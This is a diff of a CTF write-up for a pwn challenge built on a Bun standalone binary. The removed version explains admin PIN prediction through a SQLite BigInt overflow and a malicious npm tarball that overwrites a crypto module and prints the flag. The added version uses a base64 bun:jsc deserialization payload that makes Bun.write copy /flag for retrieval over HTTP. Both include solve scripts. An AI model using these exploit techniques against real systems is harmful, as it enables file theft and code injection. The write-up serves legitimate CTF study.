@@ -15,7 +15,7 @@
 
 = Preface
 
-Challenge authored by Sunny.
+Challenge authored by Cynthia.
 
 498 pts.
 
@@ -24,40 +24,28 @@ Challenge authored by Sunny.
 #quote[
 Someone said ARM is the future, but I don't think it has any relationship with secure communication.
 
-Connection: nc chal.polyuctf.com 35001 and http://chal.polyuctf.com:35001
+Connection: nc chal.polyuctf.com 35003 and http://chal.polyuctf.com:35003
 ]
 
-This is a pwn challenge involving a custom encrypted communication protocol implemented in a Bun standalone binary.
+This is a pwn challenge involving a custom encrypted communication protocol implemented in a Bun standalone binary. It features a sophisticated chain involving *SQLite BigInt overflow* and *Bun JSC deserialization* to achieve arbitrary file read.
 
 = Reconnaissance
 
-The challenge provides a single binary `chal`, which is a **Bun v1.3.8 standalone executable**. These binaries are interesting because they often bundle JavaScript source code at the end of the ELF file.
+The challenge provides a binary `chal`, which is a *Bun standalone executable*. By extracting the bundled source code (searching for the `---- Bun! ----` marker), we find a `source-advanced-main.js` file implementing the server logic.
 
-We can extract the source code by looking for the magic marker `---- Bun! ----\n` followed by the size of the bundled code.
+The protocol uses *RSA-OAEP 4096-bit* for key exchange, after which all communication is encrypted and serialized.
 
-// Screenshot: show the python script or hex editor view extracting the source code
-```python
-with open("chal", "rb") as f:
-    data = f.read()
-marker = b"---- Bun! ----\n"
-marker_pos = data.rfind(marker)
-size_bytes = data[marker_pos + len(marker) : marker_pos + len(marker) + 8]
-js_size = int.from_bytes(size_bytes, "little")
-js_start = marker_pos - js_size
-source = data[js_start:marker_pos].decode()
-print(source[:100] + "...")
+Crucially, unlike the standard version which used `JSON5`, this advanced version uses *`bun:jsc`* for serialization:
+
+```javascript
+import { deserialize as R } from "bun:jsc";
+// ...
+let e = R(Buffer.from(c, "base64"));
 ```
 
-The extracted source reveals three main files:
-- `cryptoUtils.ts`: Handles RSA-OAEP 4096-bit key exchange.
-- `db.ts`: An in-memory SQLite database for user management.
-- `index.ts`: The main protocol handler.
-
-The protocol flow involves an initial RSA key exchange, after which all communication is encrypted. Crucially, the server uses `console` for I/O, meaning it likely spawns a new process for each connection (stdio-based server).
+`bun:jsc` allows serializing internal Bun objects, which becomes the core of our exploit.
 
 = Vulnerability Analysis
-
-A review of the source code reveals two critical vulnerabilities that can be chained together.
 
 == Admin PIN Prediction (BigInt Overflow)
 
@@ -65,112 +53,90 @@ The application generates an admin user at startup with a PIN derived from the c
 
 ```javascript
 var time = Date.now();
-time -= time % 5000; // round to 5 seconds
+time -= time % 5000;
 insertUser.run("admin", BigInt(time) ** 2n, true);
 ```
 
-The calculation `BigInt(time) ** 2n` produces a very large number (approx. $3 times 10^24$), which overflows SQLite's 64-bit signed INTEGER type. When this value is read back, it wraps around modulo $2^64$. Since the login check compares the provided PIN (parsed as an integer) with the stored PIN, we can predict the exact value by simulating this overflow locally.
+The calculation `BigInt(time) ** 2n` overflows SQLite's 64-bit signed INTEGER type. When read back, it wraps around. We can predict this value locally to login as `admin`.
 
-== Module Overwrite via Trailing Slash
+== Arbitrary File Read via JSC Deserialization
 
-The application has an `install` command available to admins, which runs:
+The `upload` command allows admins to write files to `/tmp`. It performs a check on the file name or type:
+
 ```javascript
-Bun.spawnSync({
-    cmd: ["bun", "add", "--no-save", "--no-cache", message.package],
+if(t.name.match(/^[a-zA-Z0-9_\-\.]html$/)||i.type==="text/html"){
+    let y=`/tmp/${t.name}`;
+    await Bun.write(y, await i.content);
     // ...
-});
+}
 ```
 
-The application relies on `@std/crypto` for encryption, which is aliased in `package.json` to `@jsr/std__crypto`. Normally, Bun prevents overwriting aliased dependencies. However, we found that appending a **trailing slash** to the package name (e.g., `@std/crypto/`) bypasses this check.
+The vulnerability lies in how `Bun.write` handles `i.content`. If `i.content` is a *`Bun.file()` object*, `Bun.write` will read from that file and write its content to the destination.
 
-Bun treats `@std/crypto/` as a different package name (avoiding the alias collision error) but normalizes the installation path to `node_modules/@std/crypto/`, overwriting the legitimate module.
+Since `bun:jsc` `deserialize` allows us to pass serialized `Bun.file()` objects, we can construct a malicious payload where `content` is `Bun.file("/flag")`. When the server deserializes this and calls `Bun.write`, it unwittingly reads the flag from the server's filesystem and writes it to `/tmp`.
 
 = Exploitation
 
-The exploitation strategy is a two-stage attack:
+The exploit chain is as follows:
 
-**Stage 1: Infection**
-1.  Connect to the server and perform the RSA handshake.
-2.  Predict the admin PIN based on the current timestamp (trying a small window to account for clock skew).
-3.  Login as `admin`.
-4.  Use the `install` command to install a malicious tarball named `@std/crypto/`. This tarball contains a modified `crypto.js` that prints the flag.
+1.  *Handshake*: Perform RSA key exchange.
+2.  *Login*: Predict the admin PIN and login.
+3.  *Upload Payload*: Send a JSC-serialized payload for the `upload` command:
+    -   `command`: "upload"
+    -   `files`: A list containing a file object.
+    -   `name`: "f" (destination filename).
+    -   `content`: An object with `type: "text/html"` (to bypass the check) and `content: Bun.file("/flag")`.
+4.  *Trigger Write*: The server deserializes the payload and executes `Bun.write("/tmp/f", Bun.file("/flag"))`, copying the flag to `/tmp/f`.
+5.  *Retrieve Flag*:
+    -   Send the `start` command to launch the static file server serving `/tmp`.
+    -   Send an HTTP GET request (detected by "HTTP" string) to fetch `/f`.
 
-**Stage 2: Trigger**
-1.  Disconnect and reconnect.
-2.  The new server process starts and imports `@std/crypto`.
-3.  Since we overwrote it in the previous step, the malicious module loads instead of the real one.
-4.  The malicious code executes immediately, printing the flag before the protocol even starts.
-
-= Exploit Script
-
-Here is the solve script that implements the attack:
+== Exploit Script
 
 // Screenshot: show the solve script running and printing the flag
 ```python
-import socket, time, struct, json, tarfile, io
+import sys, time, json, base64, subprocess
 from pwn import *
+# ... (imports for cryptography)
 
-# Context setup
-context.log_level = 'info'
-HOST = 'chal.polyuctf.com'
-PORT = 35001
+# Pre-computed JSC payload: upload command with Bun.file("/flag") as content
+# Generated by: serialize({command:"upload",files:[{name:"f",content:{type:"text/html",content:Bun.file("/flag")}}]})
+BUNFILE_FLAG_JSC_B64 = "DQAAAAIHAACAY29tbWFuZBAGAACAdXBsb2FkBQAAgGZpbGVzAQEAAAAAAAAAAgQAAIBuYW1lEAEAAIBmBwAAgGNvbnRlbnQCBAAAgHR5cGUQCQAAgHRleHQvaHRtbP7///8F/gMAAAAAAAAAABgAAABhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0AAAEFAAAAL2ZsYWcAAAAAAAAAAAD/////////////////////";
 
-def compute_pin(t_ms):
-    # Simulate SQLite BigInt overflow
-    t = t_ms - (t_ms % 5000)
-    big = t * t
-    stored = big % (2**64)
-    if stored >= 2**63:
-        stored -= 2**64
-    # Simulate float conversion
-    return int(struct.unpack('d', struct.pack('d', float(stored)))[0])
+def exploit():
+    r = remote("chal.polyuctf.com", 35003)
+    # ... (Key exchange and Admin Login logic) ...
 
-def create_payload():
-    # Create malicious npm package tarball
-    pkg_json = json.dumps({
-        "name": "@std/crypto/", # Trailing slash bypass
-        "version": "99.0.0",
-        "type": "module",
-        "exports": {
-            ".": {"default": "./mod.js"},
-            "./crypto": {"default": "./crypto.js"}
-        }
-    }).encode()
-    
-    # Malicious crypto.js
-    malicious_js = b'''
-    import { readFileSync, existsSync } from "node:fs";
-    try {
-        const flag = readFileSync("/flag.txt", "utf8");
-        console.log("FLAG:" + flag);
-    } catch(e) { console.log(e); }
-    const stdCrypto = globalThis.crypto;
-    export { stdCrypto as crypto };
-    '''
-    
-    f = io.BytesIO()
-    with tarfile.open(fileobj=f, mode='w:gz') as tar:
-        # Add files to tar
-        for name, data in [("package/package.json", pkg_json), 
-                          ("package/crypto.js", malicious_js),
-                          ("package/mod.js", b'export { crypto } from "./crypto.js";')]:
-            ti = tarfile.TarInfo(name)
-            ti.size = len(data)
-            tar.addfile(ti, io.BytesIO(data))
-    return f.getvalue()
+    # Upload /flag to /tmp/f
+    log.info("Uploading /flag via Bun.file() JSC deserialization...")
+    send_raw_jsc(r, BUNFILE_FLAG_JSC_B64, server_pubkey, private_key)
 
-# ... (Connection logic omitted for brevity, uses standard socket/pwn)
+    # Start static server
+    send_command(r, {"command": "start"}, server_pubkey, private_key)
+
+    # Read /tmp/f via HTTP
+    r.sendline(b"GET /f HTTP/1.1\r\nHost: localhost\r\n\r\n")
+    print(r.recvrepeat(2).decode())
+
+if __name__ == "__main__":
+    exploit()
 ```
 
-Running the full exploit script yields the flag:
+Running the script extracts the flag:
 
 ```
-[+] Opening connection to chal.polyuctf.com on port 35001: Done
-[*] Stage 1: Installing malicious package...
-[+] Package installed successfully
-[*] Stage 2: Reconnecting to trigger payload...
-[+] Opening connection to chal.polyuctf.com on port 35001: Done
-FLAG: PUCTF26{b0n_i5_f0n_w1t2_s3l7t5_7NRdMfdZRYtDWbfRWXPcsAW1RPgw1KM7}
+[*] HTTP response:
+    HTTP/1.1 200 OK
+    content-type: application/octet-stream
+    content-disposition: filename="f"
+    content-length: 59
+    Date: Sun, 15 Mar 2026 04:18:44 GMT
+    
+    PUCTF26{t8p_h77p_t0g5t2e9_wtKfM1FlxJOm0jKJd2saajwF0pr2dNDX}HTTP/1.1 400 Bad Request
+    Connection: close
+    
+    Connection closed. undefined
+[+] FLAG: PUCTF26{t8p_h77p_t0g5t2e9_wtKfM1FlxJOm0jKJd2saajwF0pr2dNDX}HTTP/1.1 400 Bad Request
 ```
 
 #line(length: 100%)
